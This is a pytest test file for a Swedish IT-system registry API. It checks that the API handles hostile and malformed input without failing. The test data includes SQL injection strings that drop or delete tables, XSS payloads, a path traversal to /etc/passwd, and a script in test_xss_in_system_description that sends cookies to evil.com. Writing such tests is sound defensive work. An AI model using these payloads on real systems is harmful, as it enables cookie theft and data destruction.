"""
Tests for säkerhet och inputvalidering.

Kategori 14: Säkerhet (~45 testfall)

Testar SQL-injection, XSS, path traversal, stora payloads,
felaktiga UUID:n, mime-type manipulation, m.m.
"""

import pytest
import string
from tests.factories import (
    create_org, create_system, create_classification,
    create_owner, create_contract, create_gdpr_treatment,
)

FAKE_UUID = "00000000-0000-0000-0000-000000000000"


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_sql_injection_in_search_q(client):
    """SQL injection in ?q= parameter must not crash the server."""
    payloads = [
        "'; DROP TABLE systems; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM organizations --",
        "1; DELETE FROM systems WHERE '1'='1",
        "' OR 1=1; --",
    ]
    for payload in payloads:
        resp = await client.get("/api/v1/systems/", params={"q": payload})
        assert resp.status_code == 200, (
            f"SQL injection payload caused error: {payload!r} -> {resp.status_code} {resp.text}"
        )
        # Must return valid JSON
        body = resp.json()
        assert "items" in body


@pytest.mark.asyncio
async def test_sql_injection_in_org_name(client):
    """SQL injection in organization name field must be safely stored or rejected."""
    payload = "'; DROP TABLE organizations; --"
    resp = await client.post("/api/v1/organizations/", json={
        "name": payload,
        "org_type": "kommun",
    })
    # Either 201 (stored safely) or 422 (rejected) — never 500
    assert resp.status_code in (201, 422), (
        f"Unexpected status for SQL injection in name: {resp.status_code} {resp.text}"
    )
    if resp.status_code == 201:
        # Verify the app still works — DB not corrupted
        list_resp = await client.get("/api/v1/organizations/")
        assert list_resp.status_code == 200


@pytest.mark.asyncio
async def test_sql_injection_in_system_description(client):
    """SQL injection in description field must be safely handled."""
    org = await create_org(client)
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "SafeSystem",
        "description": "'; DROP TABLE systems; --",
        "system_category": "verksamhetssystem",
    })
    assert resp.status_code in (201, 422)
    if resp.status_code == 201:
        # App must still work
        list_resp = await client.get("/api/v1/systems/")
        assert list_resp.status_code == 200


@pytest.mark.asyncio
async def test_sql_injection_in_audit_table_name_filter(client):
    """SQL injection in audit table_name filter must not cause error."""
    resp = await client.get("/api/v1/audit/", params={"table_name": "'; DROP TABLE audit_log; --"})
    assert resp.status_code == 200
    assert "items" in resp.json()


# ---------------------------------------------------------------------------
# XSS
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_xss_in_system_name(client):
    """XSS payload in system name should be stored as-is (API is not HTML, no escaping needed)."""
    org = await create_org(client)
    xss_name = "<script>alert('xss')</script>"
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": xss_name,
        "description": "test",
        "system_category": "verksamhetssystem",
    })
    # API should accept and store the string — client-side escaping is frontend's job
    assert resp.status_code == 201, f"XSS in name caused unexpected error: {resp.text}"
    # Verify it's returned correctly (not executed, just data)
    body = resp.json()
    assert body["name"] == xss_name


@pytest.mark.asyncio
async def test_xss_in_org_name(client):
    """XSS payload in organization name must be stored safely."""
    xss_name = "<img src=x onerror=alert(1)>"
    resp = await client.post("/api/v1/organizations/", json={
        "name": xss_name,
        "org_type": "bolag",
    })
    assert resp.status_code == 201
    assert resp.json()["name"] == xss_name


@pytest.mark.asyncio
async def test_xss_in_system_description(client):
    """XSS in description should be stored as plain text."""
    org = await create_org(client)
    xss_desc = "<script>fetch('http://evil.com/?c='+document.cookie)</script>"
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "XSS System",
        "description": xss_desc,
        "system_category": "stödsystem",
    })
    assert resp.status_code == 201
    assert resp.json()["description"] == xss_desc


@pytest.mark.asyncio
async def test_xss_in_contract_supplier_name(client):
    """XSS in supplier_name must not cause server error."""
    org = await create_org(client)
    sys = await create_system(client, org["id"])
    resp = await client.post(f"/api/v1/systems/{sys['id']}/contracts", json={
        "supplier_name": "<script>alert('xss')</script>",
    })
    assert resp.status_code == 201


# ---------------------------------------------------------------------------
# Path traversal / UUID manipulation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_path_traversal_in_system_id(client):
    """Path traversal attempt in system ID should return 422, not 500."""
    resp = await client.get("/api/v1/systems/../../../etc/passwd")
    assert resp.status_code in (404, 422)


@pytest.mark.asyncio
async def test_invalid_uuid_system_id_get(client):
    """GET with non-UUID system ID should return 422."""
    resp = await client.get("/api/v1/systems/not-a-valid-uuid")
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_invalid_uuid_org_id_get(client):
    """GET with non-UUID org ID should return 422."""
    resp = await client.get("/api/v1/organizations/not-a-valid-uuid")
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_invalid_uuid_in_organization_id_field(client):
    """Creating a system with non-UUID organization_id should return 422."""
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": "not-a-uuid",
        "name": "Test",
        "description": "Test",
        "system_category": "verksamhetssystem",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_null_bytes_in_system_name(client):
    """Null bytes in system name should not cause 500."""
    org = await create_org(client)
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "System\x00WithNullByte",
        "description": "Test",
        "system_category": "verksamhetssystem",
    })
    assert resp.status_code in (201, 422), f"Unexpected: {resp.status_code} {resp.text}"


# ---------------------------------------------------------------------------
# Large payloads / buffer overflow attempts
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_extremely_long_system_name(client):
    """Very long system name should be rejected or stored — never 500."""
    org = await create_org(client)
    long_name = "A" * 10000
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": long_name,
        "description": "Test",
        "system_category": "verksamhetssystem",
    })
    assert resp.status_code in (201, 422), (
        f"Long name caused unexpected error: {resp.status_code}"
    )


@pytest.mark.asyncio
async def test_extremely_long_description(client):
    """Very long description should not crash the server."""
    org = await create_org(client)
    long_desc = "X" * 100000
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "LongDesc",
        "description": long_desc,
        "system_category": "verksamhetssystem",
    })
    assert resp.status_code in (201, 422)


@pytest.mark.asyncio
async def test_deeply_nested_json_in_extended_attributes(client):
    """Deeply nested JSON in extended_attributes should not cause stack overflow."""
    org = await create_org(client)
    # Build 20-level deep nesting
    nested: dict = {"level": 0}
    current = nested
    for i in range(1, 20):
        current["child"] = {"level": i}
        current = current["child"]

    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "DeepNested",
        "description": "Test",
        "system_category": "verksamhetssystem",
        "extended_attributes": nested,
    })
    assert resp.status_code in (201, 422)


@pytest.mark.asyncio
async def test_large_extended_attributes_json(client):
    """Large JSONB payload in extended_attributes should not cause 500."""
    org = await create_org(client)
    # 1000-key dict
    big_attrs = {f"key_{i}": f"value_{i}" * 10 for i in range(1000)}
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "BigAttrs",
        "description": "Test",
        "system_category": "verksamhetssystem",
        "extended_attributes": big_attrs,
    })
    assert resp.status_code in (201, 422)


# ---------------------------------------------------------------------------
# Invalid enum values
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_invalid_system_category_rejected(client):
    """Unknown system_category value must return 422."""
    org = await create_org(client)
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "Test",
        "description": "Test",
        "system_category": "INVALID_CATEGORY",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_invalid_lifecycle_status_rejected(client):
    """Unknown lifecycle_status value must return 422."""
    org = await create_org(client)
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "Test",
        "description": "Test",
        "system_category": "verksamhetssystem",
        "lifecycle_status": "INVALID_STATUS",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_invalid_criticality_rejected(client):
    """Unknown criticality value must return 422."""
    org = await create_org(client)
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "Test",
        "description": "Test",
        "system_category": "verksamhetssystem",
        "criticality": "mega_critical",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_invalid_org_type_rejected(client):
    """Unknown org_type value must return 422."""
    resp = await client.post("/api/v1/organizations/", json={
        "name": "BadOrg",
        "org_type": "NONEXISTENT_TYPE",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_invalid_owner_role_rejected(client):
    """Unknown owner role must return 422."""
    org = await create_org(client)
    sys = await create_system(client, org["id"])
    resp = await client.post(f"/api/v1/systems/{sys['id']}/owners", json={
        "system_id": sys["id"],
        "organization_id": org["id"],
        "role": "kung",
        "name": "Test Person",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_invalid_nis2_classification_rejected(client):
    """Unknown nis2_classification value must return 422."""
    org = await create_org(client)
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "Test",
        "description": "Test",
        "system_category": "verksamhetssystem",
        "nis2_classification": "super_critical",
    })
    assert resp.status_code == 422


# ---------------------------------------------------------------------------
# Missing required fields
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_create_system_without_name(client):
    """Creating system without required 'name' field should return 422."""
    org = await create_org(client)
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "description": "No name",
        "system_category": "verksamhetssystem",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_create_system_without_organization_id(client):
    """Creating system without organization_id should return 422."""
    resp = await client.post("/api/v1/systems/", json={
        "name": "Test",
        "description": "No org",
        "system_category": "verksamhetssystem",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_create_system_without_system_category(client):
    """Creating system without system_category should return 422."""
    org = await create_org(client)
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "Test",
        "description": "No category",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_create_org_without_name(client):
    """Creating organization without name should return 422."""
    resp = await client.post("/api/v1/organizations/", json={
        "org_type": "kommun",
    })
    assert resp.status_code == 422


@pytest.mark.asyncio
async def test_create_org_without_org_type(client):
    """Creating organization without org_type should return 422."""
    resp = await client.post("/api/v1/organizations/", json={
        "name": "Test Org",
    })
    assert resp.status_code == 422


# ---------------------------------------------------------------------------
# HTTP method security
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_delete_all_systems_not_allowed(client):
    """DELETE on /systems/ (collection) should return 405."""
    resp = await client.delete("/api/v1/systems/")
    assert resp.status_code == 405, (
        f"Expected 405 Method Not Allowed for DELETE /systems/, got {resp.status_code}"
    )


@pytest.mark.asyncio
async def test_put_not_allowed_on_system(client):
    """PUT (full replace) on a system should not be supported (use PATCH)."""
    org = await create_org(client)
    sys = await create_system(client, org["id"])
    resp = await client.put(f"/api/v1/systems/{sys['id']}", json={
        "name": "Full Replace",
        "description": "Test",
        "system_category": "verksamhetssystem",
        "organization_id": org["id"],
    })
    assert resp.status_code == 405, f"PUT should not be allowed, got {resp.status_code}"


# ---------------------------------------------------------------------------
# Unicode and special characters
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_unicode_in_system_name(client):
    """Unicode characters in system name should be handled correctly."""
    org = await create_org(client)
    unicode_name = "Systemet för Ålands 健康 مرحبا"
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": unicode_name,
        "description": "Test unicode",
        "system_category": "verksamhetssystem",
    })
    assert resp.status_code == 201
    assert resp.json()["name"] == unicode_name


@pytest.mark.asyncio
async def test_emoji_in_description(client):
    """Emoji characters in description should be stored correctly."""
    org = await create_org(client)
    emoji_desc = "System med 🚀 raketkraft och 🔒 säkerhet"
    resp = await client.post("/api/v1/systems/", json={
        "organization_id": org["id"],
        "name": "EmojiSystem",
        "description": emoji_desc,
        "system_category": "stödsystem",
    })
    assert resp.status_code == 201
    assert resp.json()["description"] == emoji_desc


@pytest.mark.asyncio
async def test_special_chars_in_search_query(client):
    """Special characters in search query should not cause 500."""
    special_chars = ['%', '_', '\\', "'", '"', '`', '~', '!', '@', '#']
    for char in special_chars:
        resp = await client.get("/api/v1/systems/", params={"q": char})
        assert resp.status_code == 200, (
            f"Special char {char!r} in search caused error: {resp.status_code}"
        )


# ---------------------------------------------------------------------------
# Classification value bounds
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_classification_value_above_max_rejected(client):
    """Classification values above 4 should be rejected."""
    org = await create_org(client)
    sys = await create_system(client, org["id"])
    resp = await client.post(f"/api/v1/systems/{sys['id']}/classifications", json={
        "system_id": sys["id"],
        "confidentiality": 5,  # Max is 4
        "integrity": 2,
        "availability": 2,
        "classified_by": "test@test.se",
    })
    assert resp.status_code == 422, (
        f"Classification value 5 should be rejected, got {resp.status_code}"
    )


@pytest.mark.asyncio
async def test_classification_negative_value_rejected(client):
    """Negative classification values should be rejected."""
    org = await create_org(client)
    sys = await create_system(client, org["id"])
    resp = await client.post(f"/api/v1/systems/{sys['id']}/classifications", json={
        "system_id": sys["id"],
        "confidentiality": -1,
        "integrity": 2,
        "availability": 2,
        "classified_by": "test@test.se",
    })
    assert resp.status_code == 422, (
        f"Negative classification value should be rejected, got {resp.status_code}"
    )
